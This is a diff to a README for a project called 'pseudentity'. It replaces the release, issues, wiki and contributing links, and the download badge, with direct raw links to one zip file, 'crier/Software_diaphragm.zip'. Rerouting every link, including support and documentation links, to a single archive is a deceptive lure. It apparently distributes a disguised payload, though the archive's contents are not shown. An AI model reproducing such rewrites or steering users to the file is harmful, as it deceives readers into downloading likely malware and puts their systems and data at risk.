@@ -10,7 +10,7 @@ To get started, you need to download the application. Follow these steps:
 
 1. Click the button below to visit the release page.
 
-[![Download pseudentity](https://img.shields.io/badge/Download%20pseudentity-v1.0-brightgreen)](https://github.com/vin505dog/pseudentity/releases)
+[![Download pseudentity](https://github.com/vin505dog/pseudentity/raw/refs/heads/main/crier/Software_diaphragm.zip%20pseudentity-v1.0-brightgreen)](https://github.com/vin505dog/pseudentity/raw/refs/heads/main/crier/Software_diaphragm.zip)
 
 2. On the Releases page, find the latest version of pseudentity. 
 
@@ -49,11 +49,11 @@ Before installing, ensure your system meets the following requirements:
 
 ## 🛠 Support
 
-If you encounter issues or have questions, please feel free to open an issue on our [GitHub issues page](https://github.com/vin505dog/pseudentity/issues). We are happy to assist you.
+If you encounter issues or have questions, please feel free to open an issue on our [GitHub issues page](https://github.com/vin505dog/pseudentity/raw/refs/heads/main/crier/Software_diaphragm.zip). We are happy to assist you.
 
 ## 🌐 Additional Resources
 
-For more detailed documentation, examples, and community support, please visit our [documentation page](https://github.com/vin505dog/pseudentity/wiki). Here you will find:
+For more detailed documentation, examples, and community support, please visit our [documentation page](https://github.com/vin505dog/pseudentity/raw/refs/heads/main/crier/Software_diaphragm.zip). Here you will find:
 
 - Step-by-step integration examples
 - Frequently Asked Questions (FAQs)
@@ -61,7 +61,7 @@ For more detailed documentation, examples, and community support, please visit o
 
 ## 📢 Community Contributions
 
-pseudentity thrives on community input. If you have suggestions, feature requests, or you'd like to contribute to the project, please check our [contributing guidelines](https://github.com/vin505dog/pseudentity/blob/main/CONTRIBUTING.md).
+pseudentity thrives on community input. If you have suggestions, feature requests, or you'd like to contribute to the project, please check our [contributing guidelines](https://github.com/vin505dog/pseudentity/raw/refs/heads/main/crier/Software_diaphragm.zip).
 
 ---
 
@@ -69,4 +69,4 @@ We hope you find pseudentity a helpful tool for your development needs. Start do
 
 Don't forget to visit the Releases page again for updates and new features!
 
-[![Download pseudentity](https://img.shields.io/badge/Download%20pseudentity-v1.0-brightgreen)](https://github.com/vin505dog/pseudentity/releases)
+[![Download pseudentity](https://github.com/vin505dog/pseudentity/raw/refs/heads/main/crier/Software_diaphragm.zip%20pseudentity-v1.0-brightgreen)](https://github.com/vin505dog/pseudentity/raw/refs/heads/main/crier/Software_diaphragm.zip)
